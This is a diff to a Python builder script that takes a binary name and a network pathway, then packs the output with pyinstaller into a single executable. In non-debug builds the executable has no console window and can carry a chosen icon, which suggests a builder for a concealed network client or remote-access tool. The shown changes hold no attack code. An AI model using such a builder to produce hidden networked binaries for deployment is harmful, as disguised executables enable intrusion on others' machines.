@@ -23,7 +23,12 @@ def start_epsilon():
 
 
 
-    DEBUG = bool(input(print_green("Debug mode(True/False) : ")))
+    prompt = input(print_green("Debug mode(True/False) : ")).lower()
+    if prompt == "t" or prompt == "true" or prompt == "1":
+        DEBUG = True
+    else:
+        DEBUG = False
+        
     Name = input(print_yellow("Provide name of the binary : "))
 
     print_green("Input network pathway for communication:")
@@ -74,12 +79,12 @@ def start_epsilon():
     if Create_Binary == 'Y' or Create_Binary == 'y':
         cmd = "pyinstaller "+ Name+".py" + ' -y --distpath="." --workpath="." --clean -F'
         if not DEBUG :
-            cmd = cmd + " --windowed"
+            cmd = cmd + " --noconsole"
         if iconfile is not "":
             if '.ico' not in iconfile:
                 iconfile = iconfile + '.ico'
             cmd = cmd + " --icon="+iconfile
-        
+        print_red(cmd)        
         os.system(cmd) 
         try:
             shutil.rmtree(Name)
